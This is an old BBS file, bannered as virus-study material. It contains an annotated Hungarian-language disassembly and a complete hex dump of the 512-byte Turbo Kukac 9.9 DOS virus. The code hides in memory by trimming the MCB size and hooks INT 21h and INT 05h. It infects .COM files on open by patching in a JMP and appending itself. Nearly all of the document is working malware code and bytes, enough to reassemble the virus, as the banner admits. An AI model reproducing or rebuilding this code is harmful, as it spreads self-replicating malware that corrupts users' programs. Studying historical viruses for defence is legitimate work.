;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
TURBO KUKAC v9.9 virus unassembled list:
								     `90.07.21.

Magyar zat: K”v ri L szl¢
	    Tel.: (41) 21-822	 07-13:20 mh.
		       21-033	    18:00-



28F8:0100 E80000	CALL	0103			;IP ‚rt‚ke az SI-be
28F8:0103 90		NOP				;ez lesz a b zis offset
28F8:0104 5E		POP	SI
28F8:0105 50		PUSH	AX
28F8:0106 51		PUSH	CX
28F8:0107 B021		MOV	AL,21
28F8:0109 B435		MOV	AH,35
28F8:010B CD21		INT	21			;INT 21h c¡m‚nek lek‚r-
							;dez‚se
28F8:010D 8CC0		MOV	AX,ES
28F8:010F 3D0040	CMP	AX,4000 		;a mem¢ri ban van ?
28F8:0112 7224		JB	0138			;nincs!
28F8:0114 83EE03	SUB	SI,+03			;b zis offset -3
							;(3 byte hosszu a JMP
							;+ az operandusa!)
28F8:0117 BAC102	MOV	DX,02C1
28F8:011A 81EA0001	SUB	DX,0100 		;0100h offset levon sa
							;(COM file saj toss ga!)
28F8:011E 03F2		ADD	SI,DX
28F8:0120 8B1C		MOV	BX,[SI] 		;JMP k¢dja + az operan-
							;dus fele
28F8:0122 8B4C02	MOV	CX,[SI+02]		;JMP operandusa + 1 byte
28F8:0125 891E0001	MOV	[0100],BX		;eredeti prg kezdet
28F8:0129 890E0201	MOV	[0102],CX		;let rol sa
28F8:012D 8CD8		MOV	AX,DS
28F8:012F 8EC0		MOV	ES,AX			;ES=DS
28F8:0131 59		POP	CX
28F8:0132 58		POP	AX
28F8:0133 BB0001	MOV	BX,0100 		;ugr s offset-je
28F8:0136 FFE3		JMP	BX			;EREDETI PROGRAM VGRE-
							;HAJTSA

			;HA MG NINCS A MEM¢RIBAN
28F8:0138 8CD8		MOV	AX,DS			;saj t szegmense
28F8:013A 48		DEC	AX			;saj t seg-1= MCB. seg.
28F8:013B 8ED8		MOV	DS,AX			;DS=MCB. szegmense
28F8:013D A10300	MOV	AX,[0003]		;DOS  lltal a programnak
							;foglalt mem¢riablokk
							;hossza
28F8:0140 2D4100	SUB	AX,0041 		;virus hossz t levonja
							;bel”le (41*16 byte)
28F8:0143 A30300	MOV	[0003],AX		;visszateszi igy a DOS
							; lltal l tott teljes
							;mem¢ria nagys ga a prg.
							;kil‚p‚se ut n (41*16
							;byte-tal) kevesebb lesz
							;Hasonl¢an csin lja ezt
							;a YANKEE DOODLE is, s
							;ezzel azt ‚ri el, hogy
							;semmilyen
							;System Storage Map
							;programmal nem mutat-
							;hat¢ ki a virus jele-
							;l‚te a mem¢ri ban!
							;A PCTOOLS system info
							;kimutatja, azaz csak
							;annyit l tni, hogy a
							;fizikai RAM m‚ret 640K
							;s a DOS  lltal l tott
							;az 639k byte! Igy k”-
							;vetkeztetni lehet...
28F8:0146 8CC8		MOV	AX,CS
28F8:0148 8ED8		MOV	DS,AX			;DS=CS
28F8:014A A10200	MOV	AX,[0002]		;PSP-ben a RAM tetej‚-
							;nek a paragrafusc¡me
28F8:014D 2D0008	SUB	AX,0800
28F8:0150 8EC0		MOV	ES,AX			;virus £j szegmense
28F8:0152 BF0001	MOV	DI,0100
28F8:0155 83EE03	SUB	SI,+03
28F8:0158 B90002	MOV	CX,0200 		;virus hossza
28F8:015B F3		REPZ
28F8:015C A4		MOVSB				;virus m sol sa az £j
							;szegmensbe
28F8:015D 8C06C702	MOV	[02C7],ES		;£j szegmens t rol sa
28F8:0161 B96C01	MOV	CX,016C 		;bel‚p‚si pont
28F8:0164 890EC502	MOV	[02C5],CX		;t rol sa
28F8:0168 FF2EC502	JMP	FAR [02C5]		;ugr s az £j szegmens
							;01c6 offset-‚re
			;UJ SZEGMENSBEN A BELPSI PONT
28F8:016C 8CC1		MOV	CX,ES
28F8:016E 8CD8		MOV	AX,DS			;ahonnan m solta mag t
28F8:0170 26		ES:
28F8:0171 A3CB02	MOV	[02CB],AX		;RGI PRG. segment c¡m
28F8:0174 B80001	MOV	AX,0100
28F8:0177 26		ES:
28F8:0178 A3C902	MOV	[02C9],AX		;0100h offset t rol sa
28F8:017B 8CC0		MOV	AX,ES
28F8:017D 8ED8		MOV	DS,AX
28F8:017F BAC701	MOV	DX,01C7 		;INT 05 - HARD COPY £j
							;offset-je
28F8:0182 B005		MOV	AL,05
28F8:0184 B425		MOV	AH,25
28F8:0186 CD21		INT	21			;INT 05 ellop sa
28F8:0188 B435		MOV	AH,35
28F8:018A B021		MOV	AL,21
28F8:018C CD21		INT	21			;INT 21h c¡m lek‚rdez‚-
							;se
28F8:018E 2E		CS:
28F8:018F 891EB702	MOV	[02B7],BX		;INT 05h offset (r‚gi)
28F8:0193 8CC3		MOV	BX,ES
28F8:0195 2E		CS:
28F8:0196 891EB902	MOV	[02B9],BX		;INT 05h segment (r‚gi)
28F8:019A B8D901	MOV	AX,01D9 		;£j INT 21h offset c¡m
28F8:019D 8BD0		MOV	DX,AX
28F8:019F 8BC1		MOV	AX,CX
28F8:01A1 8ED8		MOV	DS,AX
28F8:01A3 B021		MOV	AL,21
28F8:01A5 B425		MOV	AH,25
28F8:01A7 CD21		INT	21			;INT 21h ellop sa
28F8:01A9 8B16C102	MOV	DX,[02C1]		;EREDETI JMP + AZ
28F8:01AD 8B0EC302	MOV	CX,[02C3]		;OPERANDUSA!!!
28F8:01B1 A1CB02	MOV	AX,[02CB]		;EREDETI PRG. SEG!!!
28F8:01B4 8ED8		MOV	DS,AX
28F8:01B6 89160001	MOV	[0100],DX		;eredeti JMP k¢dja
28F8:01BA 890E0201	MOV	[0102],CX		;‚s operandusa
28F8:01BE 8EC0		MOV	ES,AX
28F8:01C0 59		POP	CX
28F8:01C1 58		POP	AX
28F8:01C2 2E		CS:
28F8:01C3 FF2EC902	JMP	FAR [02C9]		;EREDETI PROGRAM FUTTA-
							;TSA!
			;£j INT 05 - HARD COPY rutin
28F8:01C7 90		NOP
28F8:01C8 50		PUSH	AX
28F8:01C9 1E		PUSH	DS
28F8:01CA 52		PUSH	DX
28F8:01CB 8CC8		MOV	AX,CS
28F8:01CD 8ED8		MOV	DS,AX
			;VGTELEN CIKLUS!
28F8:01CF BACE02	MOV	DX,02CE 		;sz”veg kezdete
							;Turbo Kukac v9.9
28F8:01D2 B409		MOV	AH,09			;print string
28F8:01D4 E8D900	CALL	02B0			;r‚gi INT 21h hiv sa
28F8:01D7 EBF6		JMP	01CF			;£jra!

			;£j INT 21h rutin
28F8:01D9 90		NOP
28F8:01DA 80FC3D	CMP	AH,3D			;file nyit sa alfunkci¢?
28F8:01DD 7403		JZ	01E2			;igen
28F8:01DF E9C700	JMP	02A9			;nem ugr sa az eredeti
							;INT 21h-ra
28F8:01E2 90		NOP
28F8:01E3 1E		PUSH	DS
28F8:01E4 06		PUSH	ES
28F8:01E5 50		PUSH	AX
28F8:01E6 53		PUSH	BX
28F8:01E7 51		PUSH	CX
28F8:01E8 52		PUSH	DX
28F8:01E9 57		PUSH	DI
28F8:01EA 56		PUSH	SI

			;File kiterjeszt‚s ellen”rz‚se

28F8:01EB 8BFA		MOV	DI,DX			;file PATH kezdete
28F8:01ED 8CDE		MOV	SI,DS
28F8:01EF 8EC6		MOV	ES,SI			;ES=DS (igy a file PATH
							; tv‚tele!)
28F8:01F1 B000		MOV	AL,00			;PATH lez r¢ nulla
28F8:01F3 B93200	MOV	CX,0032 		;file secifik ci¢ hossza
28F8:01F6 FC		CLD				;el”re
28F8:01F7 F2		REPNZ
28F8:01F8 AE		SCASB				;PATH lez r¢ 0 byte ke-
							;res‚se
28F8:01F9 83EF03	SUB	DI,+03			;-3 igy a kiterjeszt‚s
							;kezdet+1 pozici¢ra mu-
							;tat
28F8:01FC B84F4D	MOV	AX,4D4F 		;'OM' AX-be
28F8:01FF 26		ES:
28F8:0200 3B05		CMP	AX,[DI] 		; 'OM' a v‚ge ?
28F8:0202 7403		JZ	0207			;igen val szinleg COM
							;file
28F8:0204 E99A00	JMP	02A1			;nem COM ugr s az erede-
							;ti INT 21h-ra
28F8:0207 B82E43	MOV	AX,432E 		;'.C' AX-be
28F8:020A 26		ES:
28F8:020B 3B45FE	CMP	AX,[DI-02]		; '.C' ?
28F8:020E 7403		JZ	0213			;biztos hogy COM file!
28F8:0210 E98E00	JMP	02A1			;nem COM ugr s az erede-
							;ti INT 21h-ra
			;File nyit sa

28F8:0213 B43D		MOV	AH,3D			;file nyit s
28F8:0215 B002		MOV	AL,02			;¡r s/olvas s
28F8:0217 E89600	CALL	02B0			;INT 21h hiv sa
28F8:021A 7303		JNB	021F			;ha nincs hiba
28F8:021C E98200	JMP	02A1			;hiba eset‚n ugr s az
							;eredeti INT 21h-ra
28F8:021F 8BD8		MOV	BX,AX			;file kezel”

			;File m‚ret ellen”rz‚s

28F8:0221 B90000	MOV	CX,0000
28F8:0224 BA0000	MOV	DX,0000
28F8:0227 B002		MOV	AL,02			;file v‚g‚re
28F8:0229 B442		MOV	AH,42			;file pointer mozgat sa
28F8:022B E88200	CALL	02B0			;INT 21h hiv sa
28F8:022E 3D00FE	CMP	AX,FE00
28F8:0231 736E		JNB	02A1			;ha nem nagyobb a file
							;65024 byte-n l
28F8:0233 2D0300	SUB	AX,0003 		;JMP+op hossza

			;Fert”zend” file eredeti 4 byte j nak
			;beolvas sa

28F8:0236 2E		CS:
28F8:0237 A3BE02	MOV	[02BE],AX		;let rolja
28F8:023A B442		MOV	AH,42			;file pointer mozgat sa
28F8:023C B000		MOV	AL,00			;file elej‚re
28F8:023E B90000	MOV	CX,0000
28F8:0241 BA0000	MOV	DX,0000
28F8:0244 E86900	CALL	02B0			;INT 21h hiv sa
28F8:0247 B43F		MOV	AH,3F			;olvas s file-b¢l
28F8:0249 B90400	MOV	CX,0004 		;4 byte
28F8:024C BAC102	MOV	DX,02C1 		;ide tegye
28F8:024F 8CCF		MOV	DI,CS
28F8:0251 8EDF		MOV	DS,DI			;DS=CS
28F8:0253 E85A00	CALL	02B0			;INT 21h hiv sa
28F8:0256 B005		MOV	AL,05
28F8:0258 3A06C402	CMP	AL,[02C4]		;utols¢ byte=5 ?
28F8:025C 7443		JZ	02A1			;igen, ugr s az eredeti
							;INT 21h -ra

			;Fert”zend” file-ba a virusra
			;mutat¢ JMP+op. ki¡r sa (4 byte)

28F8:025E B442		MOV	AH,42			;file pointer mozgat sa
28F8:0260 B000		MOV	AL,00			;file elej‚re
28F8:0262 B90000	MOV	CX,0000
28F8:0265 8BD1		MOV	DX,CX
28F8:0267 E84600	CALL	02B0			;INT 21h hiv sa
28F8:026A B0E9		MOV	AL,E9			;JMP k¢dja
28F8:026C 2E		CS:
28F8:026D A2BD02	MOV	[02BD],AL		;let rolja
28F8:0270 B005		MOV	AL,05
28F8:0272 2E		CS:
28F8:0273 A2C002	MOV	[02C0],AL
28F8:0276 B90400	MOV	CX,0004 		;4 byte
28F8:0279 BABD02	MOV	DX,02BD 		;JMP + op. kezdete
28F8:027C 8CC8		MOV	AX,CS
28F8:027E 8ED8		MOV	DS,AX
28F8:0280 B440		MOV	AH,40			;ki¡r s file-ba
28F8:0282 E82B00	CALL	02B0			;INT 21h hiv sa

			;Program megfert”z‚se 0200h byte ki¡r sa
			;azaz a virus m”g‚m sol sa

28F8:0285 B442		MOV	AH,42			;file pointer mozgat sa
28F8:0287 B002		MOV	AL,02			;file v‚g‚re
28F8:0289 B90000	MOV	CX,0000
28F8:028C 8BD1		MOV	DX,CX
28F8:028E E81F00	CALL	02B0			;INT 21h hiv sa
28F8:0291 BA0001	MOV	DX,0100 		;0100h ofset-t”l
28F8:0294 B90002	MOV	CX,0200 		;0200h byte virus hossza
28F8:0297 B440		MOV	AH,40			;ki¡r s file-ba
28F8:0299 E81400	CALL	02B0			;INT 21h hiv sa
28F8:029C B43E		MOV	AH,3E			;file z r sa
28F8:029E E80F00	CALL	02B0			;INT 21h hiv sa
28F8:02A1 5E		POP	SI
28F8:02A2 5F		POP	DI
28F8:02A3 5A		POP	DX
28F8:02A4 59		POP	CX
28F8:02A5 5B		POP	BX
28F8:02A6 58		POP	AX
28F8:02A7 07		POP	ES
28F8:02A8 1F		POP	DS

28F8:02A9 90		NOP
28F8:02AA 2E		CS:
28F8:02AB FF2EB702	JMP	FAR [02B7]		;eredeti INT 21h-ra
28F8:02AF CF		IRET
			;Eredeti INT 21h hiv sa
28F8:02B0 9C		PUSHF				;elmenti mivel az IRET
							;visszamenti a flag-eket
28F8:02B1 2E		CS:
28F8:02B2 FF1EB702	CALL	FAR [02B7]		;eredeti INT 21h hiv sa
28F8:02B6 C3		RET

28F8:02B7 16		PUSH	SS
28F8:02B8 130C		ADC	CX,[SI]
28F8:02BA 0202		ADD	AL,[BP+SI]
28F8:02BC 00E9		ADD	CL,CH
28F8:02BE 06		PUSH	ES
28F8:02BF 06		PUSH	ES
28F8:02C0 05E906	ADD	AX,06E9
28F8:02C3 0405		ADD	AL,05
28F8:02C5 0100		ADD	[BX+SI],AX
28F8:02C7 0000		ADD	[BX+SI],AL
28F8:02C9 0001		ADD	[BX+DI],AL
28F8:02CB F0		LOCK
28F8:02CC 0901		OR	[BX+DI],AX
28F8:02CE 54		PUSH	SP
28F8:02CF 7572		JNZ	0343
28F8:02D1 62		DB	62
28F8:02D2 6F		DB	6F
28F8:02D3 204B75	AND	[BP+DI+75],CL
28F8:02D6 6B		DB	6B
28F8:02D7 61		DB	61
28F8:02D8 63		DB	63
28F8:02D9 2039		AND	[BX+DI],BH
28F8:02DB 2E		CS:
28F8:02DC 3920		CMP	[BX+SI],SP
28F8:02DE 2020		AND	[BX+SI],AH
28F8:02E0 2020		AND	[BX+SI],AH
28F8:02E2 2024		AND	[SI],AH
28F8:02E4 0000		ADD	[BX+SI],AL

28F8:02FC 0000		ADD	[BX+SI],AL
28F8:02FE FA		CLI
28F8:02FF 00C7		ADD	BH,AL

Megjegyz‚s:

	Nagyon primit¡v virus, de megvan a maga zsenialit sa, k‚t legyet
	t egy csap sra, pl COPY parancs eset‚n megnyit egy com file-t,s
	ha a virus a mem¢ri ban van, akkor m‚g a m soland¢ file-t megfer-
	t”zi, s a COPY m r a fert”z”tt file-t m solja! Nem igaz n k r-
	t‚kony v¡rus, puszt n mindentt ott akar lenni, s nehez¡teni a
	felhaszn l¢(k) munk j t! M‚rete nagyon kicsi, mind”ssze 512 byte!
	Hi nyoznak a v¡rusb¢l az (tapasztalataim szerint) eddigi virusok-
	ban fellelhet” ellen”rz‚sek, gondolok itt arra, hogy ha megt”rt‚nik
	egy file-ba (hoz) val¢ ki¡r s nem ellen”rzi a program hogy val¢ban
	ki¡rta-e azt az X byte-ot. Tov bb  mikor rezidess‚ (nem {hivatalo-
	san} bejegyzetten) teszi mag t nem m¢dos¡tja az MCB. 13. byte-j n
	l‚v” RAM tetej‚nek a paragrafus c¡m‚tt a saj t maga  lltal lefog-
	lalt m‚rettel (kivon s!), mint PL. a Yankee Doodle! A Yankee m‚g
	azt is megn‚zi, hogy amit meg akar fert”zni az az utols¢ mem¢.
	blokkban van-e, b r abban kell lennie, mert a DOS egy programnak
	odaadja a teljes szabad mem¢ri t, ami van...


DUMP:

28F8:0100  E8 00 00 90 5E 50 51 B0-21 B4 35 CD 21 8C C0 3D   ....^PQ.!.5.!..=
28F8:0110  00 40 72 24 83 EE 03 BA-C1 02 81 EA 00 01 03 F2   .@r$............
28F8:0120  8B 1C 8B 4C 02 89 1E 00-01 89 0E 02 01 8C D8 8E   ...L............
28F8:0130  C0 59 58 BB 00 01 FF E3-8C D8 48 8E D8 A1 03 00   .YX.......H.....
28F8:0140  2D 41 00 A3 03 00 8C C8-8E D8 A1 02 00 2D 00 08   -A...........-..
28F8:0150  8E C0 BF 00 01 83 EE 03-B9 00 02 F3 A4 8C 06 C7   ................
28F8:0160  02 B9 6C 01 89 0E C5 02-FF 2E C5 02 8C C1 8C D8   ..l.............
28F8:0170  26 A3 CB 02 B8 00 01 26-A3 C9 02 8C C0 8E D8 BA   &......&........
28F8:0180  C7 01 B0 05 B4 25 CD 21-B4 35 B0 21 CD 21 2E 89   .....%.!.5.!.!..
28F8:0190  1E B7 02 8C C3 2E 89 1E-B9 02 B8 D9 01 8B D0 8B   ................
28F8:01A0  C1 8E D8 B0 21 B4 25 CD-21 8B 16 C1 02 8B 0E C3   ....!.%.!.......
28F8:01B0  02 A1 CB 02 8E D8 89 16-00 01 89 0E 02 01 8E C0   ................
28F8:01C0  59 58 2E FF 2E C9 02 90-50 1E 52 8C C8 8E D8 BA   YX......P.R.....
28F8:01D0  CE 02 B4 09 E8 D9 00 EB-F6 90 80 FC 3D 74 03 E9   ............=t..
28F8:01E0  C7 00 90 1E 06 50 53 51-52 57 56 8B FA 8C DE 8E   .....PSQRWV.....
28F8:01F0  C6 B0 00 B9 32 00 FC F2-AE 83 EF 03 B8 4F 4D 26   ....2........OM&
28F8:0200  3B 05 74 03 E9 9A 00 B8-2E 43 26 3B 45 FE 74 03   ;.t......C&;E.t.
28F8:0210  E9 8E 00 B4 3D B0 02 E8-96 00 73 03 E9 82 00 8B   ....=.....s.....
28F8:0220  D8 B9 00 00 BA 00 00 B0-02 B4 42 E8 82 00 3D 00   ..........B...=.
28F8:0230  FE 73 6E 2D 03 00 2E A3-BE 02 B4 42 B0 00 B9 00   .sn-.......B....
28F8:0240  00 BA 00 00 E8 69 00 B4-3F B9 04 00 BA C1 02 8C   .....i..?.......
28F8:0250  CF 8E DF E8 5A 00 B0 05-3A 06 C4 02 74 43 B4 42   ....Z...:...tC.B
28F8:0260  B0 00 B9 00 00 8B D1 E8-46 00 B0 E9 2E A2 BD 02   ........F.......
28F8:0270  B0 05 2E A2 C0 02 B9 04-00 BA BD 02 8C C8 8E D8   ................
28F8:0280  B4 40 E8 2B 00 B4 42 B0-02 B9 00 00 8B D1 E8 1F   .@.+..B.........
28F8:0290  00 BA 00 01 B9 00 02 B4-40 E8 14 00 B4 3E E8 0F   ........@....>..
28F8:02A0  00 5E 5F 5A 59 5B 58 07-1F 90 2E FF 2E B7 02 CF   .^_ZY[X.........
28F8:02B0  9C 2E FF 1E B7 02 C3 16-13 0C 02 02 00 E9 06 06   ................
28F8:02C0  05 E9 06 04 05 01 00 00-00 00 01 F0 09 01	     ..............

	   ;Ki¡rand¢ sz”veg kezdete
28F8:02C0					     54 75		   Tu
28F8:02D0  72 62 6F 20 4B 75 6B 61-63 20 39 2E 39 20 20 20   rbo Kukac 9.9
28F8:02E0  20 20 20 24						$

28F8:02E0	       00 00 00 00-00 00 00 00 00 00 00 00	 ............
28F8:02F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 FA 00   ................
28F8:0300  C7						     .

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
